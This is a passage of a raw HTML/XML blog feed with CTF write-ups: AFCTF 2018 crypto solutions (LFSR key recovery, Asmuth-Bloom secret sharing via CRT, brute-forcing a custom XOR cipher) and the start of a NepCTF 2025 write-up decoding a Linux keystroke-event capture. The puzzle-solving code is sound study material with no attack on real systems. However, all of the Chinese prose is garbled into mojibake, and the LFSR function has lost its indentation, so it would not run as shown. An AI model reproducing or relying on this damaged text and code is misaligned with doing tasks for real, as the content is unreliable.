class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">plaintext = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Tiny LFSR\\Plain.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>ciphertext = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Tiny LFSR\\cipher.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br>key_bytes = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(plaintext), <span class="hljs-built_in">len</span>(ciphertext))):<br>    key_bytes.append(plaintext[i] ^ ciphertext[i])<br><br>key = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;%02x&#x27;</span> % b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> key_bytes])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Recovered key:&quot;</span>, key)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr</span>(<span class="hljs-params">R, mask</span>):<br>output = (R &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>i=(R&amp;mask)&amp;<span class="hljs-number">0xffffffffffffffff</span><br>lastbit=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i!=<span class="hljs-number">0</span>:<br>lastbit^=(i&amp;<span class="hljs-number">1</span>)<br>i=i&gt;&gt;<span class="hljs-number">1</span><br>output^=lastbit<br><span class="hljs-keyword">return</span> (output,lastbit)<br><br>R = <span class="hljs-built_in">int</span>(key,<span class="hljs-number">16</span>)<br>mask = <span class="hljs-number">0b1101100000000000000000000000000000000000000000000000000000000000</span><br><br>a = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> [key[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), <span class="hljs-number">2</span>)]])<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Tiny LFSR\\flag_encode.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>ff = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Tiny LFSR\\flag.txt&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>s = f.read()<br>f.close()<br>lent = <span class="hljs-built_in">len</span>(s)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(a)):<br>ff.write((s[i]^<span class="hljs-built_in">ord</span>(a[i])).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a), lent):<br>    tmp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        (R,out)=lfsr(R,mask)<br>        tmp=(tmp &lt;&lt; <span class="hljs-number">1</span>)^out<br>    ff.write((tmp^s[i]).to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>))<br>ff.close()<br></code></pre></td></tr></table></figure><h1 id="ä½ å¬è¯´è¿‡ä¸€æ¬¡ä¸€å¯†å—"><a href="#ä½ å¬è¯´è¿‡ä¸€æ¬¡ä¸€å¯†å—" class="headerlink" title="ä½ å¬è¯´è¿‡ä¸€æ¬¡ä¸€å¯†å—"></a>ä½ å¬è¯´è¿‡ä¸€æ¬¡ä¸€å¯†å—</h1><p>è²Œä¼¼è¿™é¢˜é¢˜ç›®æœ‰äº›é—®é¢˜ï¼Œè€Œä¸”ä¹‹å‰åœ¨BUUä¸Šåˆ·è¿‡ï¼Œæ­¤æ¬¡ç›®çš„æ˜¯æŸ¥æ¼è¡¥ç¼ºï¼Œè¿™é‡Œå°±ä¸å†å¤šå†™äº†ï¼Œç›´æ¥ä¸Šå¤§ä½¬è®²è§£ï¼š<a href="https://www.ruanx.net/many-time-pad/">Many-Time-Pad æ”»å‡»</a></p><h1 id="èŠ±å¼€è—å®åœ°"><a href="#èŠ±å¼€è—å®åœ°" class="headerlink" title="èŠ±å¼€è—å®åœ°"></a>èŠ±å¼€è—å®åœ°</h1><p>é¢˜ç›®é™„ä»¶æœ‰5ä¸ªå‹ç¼©åŒ…ï¼Œæ ¹æ®æç¤ºåˆ†æï¼Œ5ä¸ªå‹ç¼©åŒ…åˆ†åˆ«ä¸ºæ•°å­—çˆ†ç ´ã€å°å†™å­—æ¯çˆ†ç ´ã€å¤§å†™å­—æ¯çˆ†ç ´ã€ä¼ªåŠ å¯†ã€ntfsæµéšå†™<br><img src="/2025/07/31/AFCTF%202018%20Writeup/file-20250802024021280.png"><br>æœ€åè·å–åˆ°äº”ç»„æ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">x1 = <span class="hljs-number">305345133911395218573790903508296238659147802274031796643017539011648802808763162902335644195648525375518941848430114497150082025133000033835083076541927530829557051524161069423494451667848236452337271862085346869364976989047180532167560796470067549915390773271207901537847213882479997325575278672917648417868759077150999044891099206133296336190476413164240995177077671480352739572539631359</span><br>m1 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413</span><br>x2 = <span class="hljs-number">152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583</span><br>m2 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553</span><br>x3 = <span class="hljs-number">40952412095267791829743119118333311932687870987919948671780408726886151430242690997238831410249436653299224291445012397813221016909468630372862610415470277301591535416193017906909638241212666990959976187895288689640250810487806568164431359887246760313154046201720715301307811951233077581047872827004824833876458687145628724339714212107812941785880896399800008924818580623979723496070665230</span><br>m3 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820819351</span><br>x4 = <span class="hljs-number">100459779913520540098065407420629954816677926423356769524759072632219106155849450125185205557491138357760494272691949199099803239098119602186117878931534968435982565071570831032814288620974807498206233914826253433847572703407678712965098320122549759579566316372220959610814573945698083909575005303253205653244238542300266460559790606278310650849881421791081944960157781855164700773081375247</span><br>m4 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820820091</span><br>x5 = <span class="hljs-number">230502064382947282343660159791611936696520807970361139469603458689311286041516767875903549263861950740778705012699983268093626403307298415066249636346303539570207577050391796770068203937723627361951969413683246596072925692670365490970847825269581004483964261491917680759091791653759514213188778401968676433284753781006738293752440186858616315727565803777032119737689210471541053061940547213</span><br>m5 = <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820822249</span><br></code></pre></td></tr></table></figure><p>é¢˜ç›®è¿˜ç»™äº†ä¸€ä¸ªæ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857</span><br></code></pre></td></tr></table></figure><p>åŸæœ¬æ²¡çœ‹æ‡‚æ˜¯ä»€ä¹ˆï¼Œåæ¥æœäº†ä¸€ä¸‹æ‰çŸ¥é“æ˜¯Asmuth-Bloomé—¨é™æ–¹æ¡ˆï¼Œå‚è€ƒï¼š<a href="https://webencrypt.org/secretsharing/#bloom">Secret Sharing - Web Encrypt</a><br>ç›´æ¥ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>remainders = [<span class="hljs-number">305345133911395218573790903508296238659147802274031796643017539011648802808763162902335644195648525375518941848430114497150082025133000033835083076541927530829557051524161069423494451667848236452337271862085346869364976989047180532167560796470067549915390773271207901537847213882479997325575278672917648417868759077150999044891099206133296336190476413164240995177077671480352739572539631359</span>, <span class="hljs-number">152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583</span>, <span class="hljs-number">40952412095267791829743119118333311932687870987919948671780408726886151430242690997238831410249436653299224291445012397813221016909468630372862610415470277301591535416193017906909638241212666990959976187895288689640250810487806568164431359887246760313154046201720715301307811951233077581047872827004824833876458687145628724339714212107812941785880896399800008924818580623979723496070665230</span>]<br>moduli = [<span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413</span>, <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553</span>, <span class="hljs-number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820819351</span>]<br>P = <span class="hljs-number">80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crt</span>(<span class="hljs-params">rs, ms</span>):<br>    total = <span class="hljs-number">0</span><br>    prod = math.prod(ms)<br>    <span class="hljs-keyword">for</span> r, m <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(rs, ms):<br>        p = prod // m<br>        total += r * <span class="hljs-built_in">pow</span>(p, -<span class="hljs-number">1</span>, m) * p<br>    <span class="hljs-keyword">return</span> total % prod<br><br><span class="hljs-built_in">print</span>(long_to_bytes(crt(remainders, moduli)%P))<br></code></pre></td></tr></table></figure><h1 id="ä¸€é“æœ‰è¶£çš„é¢˜ç›®"><a href="#ä¸€é“æœ‰è¶£çš„é¢˜ç›®" class="headerlink" title="ä¸€é“æœ‰è¶£çš„é¢˜ç›®"></a>ä¸€é“æœ‰è¶£çš„é¢˜ç›®</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#åŠ å¯†ä»£ç </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plainText</span>):<br>    space = <span class="hljs-number">10</span><br>    cipherText = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plainText)): <br>        <span class="hljs-keyword">if</span> i + space &lt; <span class="hljs-built_in">len</span>(plainText) - <span class="hljs-number">1</span>: <br>            cipherText += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(plainText[i]) ^ <span class="hljs-built_in">ord</span>(plainText[i + space]))  <br>        <span class="hljs-keyword">else</span>:<br>            cipherText += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(plainText[i]) ^ <span class="hljs-built_in">ord</span>(plainText[space]))    <br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(plainText[i]) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>: <br>            space += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            space -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> cipherText<br>    <br><span class="hljs-comment"># å¯†ç </span><br><span class="hljs-comment"># 15120d1a0a0810010a031d3e31000d1d170d173b0d173b0c07060206</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>æœ¬é¢˜æ˜¯ä¸€é“ç®—æ³•é€†å‘åˆ†æé¢˜ï¼Œä½†æ˜¯é€†å‘æ±‚è§£æ—¶æˆ‘ä»¬ä¸çŸ¥é“<code>space</code>çš„å…·ä½“å€¼ï¼Œä¹Ÿå°±æ²¡åŠæ³•ç¡®å®šå¯¹åº”çš„è®¡ç®—æ–¹ç¨‹ã€‚<br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°å¯†æ–‡çš„å­—èŠ‚é•¿åº¦åªæœ‰28ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•çˆ†ç ´æ¯ä¸€ä½æ˜æ–‡çš„æœ€åä¸€ä½bitï¼ˆæ€»å…±çº¦$2^{28}$ç§å¯èƒ½çš„åºåˆ—ï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬ä¾¿èƒ½æ±‚å‡ºæ­£ç¡®çš„<code>space</code>åºåˆ—ã€‚<br>å¦‚ä½•åˆ¤æ–­æ¯ä¸ªæ˜æ–‡<code>lastbitï¼ˆå³ä»£ç ä¸­çš„seqï¼‰</code>åºåˆ—æ˜¯å¦æ­£ç¡®å‘¢ï¼Ÿç”±äºåŠ å¯†ç®—æ³•ä½¿ç”¨çš„æ˜¯å¼‚æˆ–ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨åŠ å¯†ç®—æ³•æ¥å•ç‹¬å¯¹æ˜æ–‡çš„<code>lastbit</code>è¿›è¡ŒåŠ å¯†ï¼Œå†å¯¹æ¯”å¯†æ–‡çš„<code>lastbit</code>æ˜¯å¦ä¸€ä¸€å¯¹åº”ï¼Œè‹¥ç¡®å®ä¸€ä¸€å¯¹åº”ï¼Œé‚£å¤§æ¦‚ç‡æ˜¯æ­£ç¡®çš„<code>lastbit</code>åºåˆ—ã€‚<br>ä¹‹åå†é€šè¿‡æˆ‘ä»¬å·²çŸ¥çš„éƒ¨åˆ†æ˜æ–‡å­—èŠ‚<code>afctf&#123;</code>ï¼Œä¾¿å¯ä»¥é€†å‘æ±‚è§£äº†ã€‚<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> trange<br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;15120d1a0a0810010a031d3e31000d1d170d173b0d173b0c07060206&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lastbit</span>():<br>    space = <span class="hljs-number">10</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> trange(<span class="hljs-number">2</span>**<span class="hljs-number">28</span>):<br>        seq = <span class="hljs-built_in">bin</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">28</span>)<br>        space = <span class="hljs-number">10</span><br>        f = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>):<br>            <span class="hljs-keyword">if</span> i + space &lt; <span class="hljs-number">28</span> - <span class="hljs-number">1</span>:<br>                tx = <span class="hljs-built_in">int</span>(seq[i]) ^ <span class="hljs-built_in">int</span>(seq[i + space])<br>            <span class="hljs-keyword">else</span>:<br>                tx = <span class="hljs-built_in">int</span>(seq[i]) ^ <span class="hljs-built_in">int</span>(seq[space])<br><br>            <span class="hljs-keyword">if</span> tx != cipher[i] % <span class="hljs-number">2</span>:<br>                f = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(seq[i]) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>                space += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                space -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> f == <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(seq)<br>            <span class="hljs-keyword">return</span> seq<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cipher_bytes, known_prefix=<span class="hljs-string">b&#x27;afctf&#123;&#x27;</span></span>):<br>    plain = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(cipher_bytes)<br>    space = <span class="hljs-number">10</span><br>    seq = get_lastbit()<br>    <span class="hljs-comment">#temp = 1010011010010101111111101001</span><br>    <span class="hljs-built_in">print</span>(seq)<br>    seq_bits = [<span class="hljs-built_in">int</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(seq)] <br>    <span class="hljs-built_in">print</span>(seq_bits)<br>    space_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(seq_bits)):<br>        <span class="hljs-keyword">if</span> seq_bits[i] % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            space += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            space -= <span class="hljs-number">1</span><br>        space_list.append(space)<br>    <span class="hljs-built_in">print</span>(space_list)<br>    <span class="hljs-comment">#éƒ¨åˆ†å·²çŸ¥å‰ç¼€</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(known_prefix)):<br>        plain[i] = known_prefix[i]<br><br>    <span class="hljs-comment">#é€†å‘é€å­—èŠ‚æ¢å¤</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher_bytes)-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> i + space_list[i-<span class="hljs-number">1</span>] &lt; <span class="hljs-built_in">len</span>(cipher_bytes):<br>            plain[i] = plain[i + space_list[i-<span class="hljs-number">1</span>]] ^ cipher_bytes[i]<br>        <span class="hljs-keyword">else</span>:<br>            plain[i] = plain[space_list[i-<span class="hljs-number">1</span>]] ^ cipher_bytes[i]<br><br>        <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(plain)<br><br>flag = decrypt(cipher)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NepCTF 2025 Writeup</title>
    <link href="/2025/07/25/NepCTF%202025%20Writeup/"/>
    <url>/2025/07/25/NepCTF%202025%20Writeup/</url>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹NepCTFæ¯”èµ›MISCå’ŒCryptoæ–¹å‘çš„éƒ¨åˆ†è¯•é¢˜å¤ç°ï¼ˆæœ‰äº›æš‚æ—¶æ²¡çœ‹æ‡‚ï¼Œåç»­æœ‰ç©ºå†æ¥ç€å¤ç°å§ï¼‰ï¼Œé¢˜ç›®è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œè¦†ç›–é¢æ¯”è¾ƒå¹¿ï¼Œå­¦åˆ°äº†è®¸å¤šçŸ¥è¯†(&#96;ãƒ»Ï‰ãƒ»Â´)</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="NepBotEvent"><a href="#NepBotEvent" class="headerlink" title="NepBotEvent"></a>NepBotEvent</h2><p>æ ¹æ®é¢˜ç›®åˆ†æï¼Œè¯¥é¢˜æ‰€ç»™çš„æ–‡ä»¶è·ŸKeyloggeræœ‰å…³ï¼Œä¹Ÿå°±æ˜¯è·Ÿé”®ç›˜æµé‡ç›¸å…³ã€‚<br>æåˆ°é”®ç›˜æµé‡åˆ†æï¼Œæˆ‘ä»¬å°±ä¼šæƒ³åˆ°HID DATAçš„8å­—èŠ‚çš„æ•°æ®ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¹¶ä¸æ˜¯æµé‡æ•°æ®åŒ…ï¼Œå› æ­¤ä¸èƒ½å¤Ÿè®©wiresharkå¸®æˆ‘ä»¬æå–å‡ºHID dataï¼Œå› æ­¤æˆ‘ä»¬è¦é€šè¿‡äºŒè¿›åˆ¶æ•°æ®æ¥åˆ†æå‡ºå“ªäº›æ•°æ®ä»£è¡¨ç€HID dataã€‚<br>é€šè¿‡æœç´¢å¯ä»¥å‘ç°ï¼Œå…¶å®è¯¥æ–‡ä»¶æ˜¯ Linux ä¸‹å¸¸è§çš„é”®ç›˜äº‹ä»¶æ•°æ®ï¼Œæ¯ç»„24ä¸ªå­—èŠ‚ï¼Œå¯¹åº” Linux input å­ç³»ç»Ÿçš„Â <code>input_event</code>Â ç»“æ„ä½“ã€‚<br>è¯¥ç»“æ„ä½“å®šä¹‰åœ¨Â <code>/usr/include/linux/input.h</code>ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">timeval</span> &#123;<br>    <span class="hljs-type">long</span> tv_sec;   <span class="hljs-comment">// 8å­—èŠ‚ï¼Œç§’</span><br>    <span class="hljs-type">long</span> tv_usec;  <span class="hljs-comment">// 8å­—èŠ‚ï¼Œå¾®ç§’</span><br>&#125;;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">input_event</span> &#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">timeval</span> time; <span class="hljs-comment">// 16å­—èŠ‚</span><br>    __u16 type;          <span class="hljs-comment">// 2å­—èŠ‚</span><br>    __u16 code;          <span class="hljs-comment">// 2å­—èŠ‚</span><br>    __s32 value;         <span class="hljs-comment">// 4å­—èŠ‚</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥aiä¸€ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exp.py</span><br><span class="hljs-comment"># è¯»å–å’Œè§£æLinux evdevé”®ç›˜äº‹ä»¶æ–‡ä»¶ï¼ˆæ¯ç»„24å­—èŠ‚ï¼‰ï¼Œæ¢å¤è¾“å…¥æŒ‰é”®ï¼ŒåŒæ—¶è®°å½•shiftæŒ‰é”®çš„æŒ‰ä¸‹ä¸æ¾å¼€</span><br><br><span class="hljs-keyword">import</span> struct<br><br>LINUX_KEYCODE = &#123;<br>    <span class="hljs-number">1</span>: <span class="hljs-string">&#x27;[ESC]&#x27;</span>, <span class="hljs-number">2</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">3</span>: <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">5</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-number">6</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-number">7</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-number">9</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-number">10</span>: <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-number">11</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-number">12</span>: <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-number">13</span>: <span 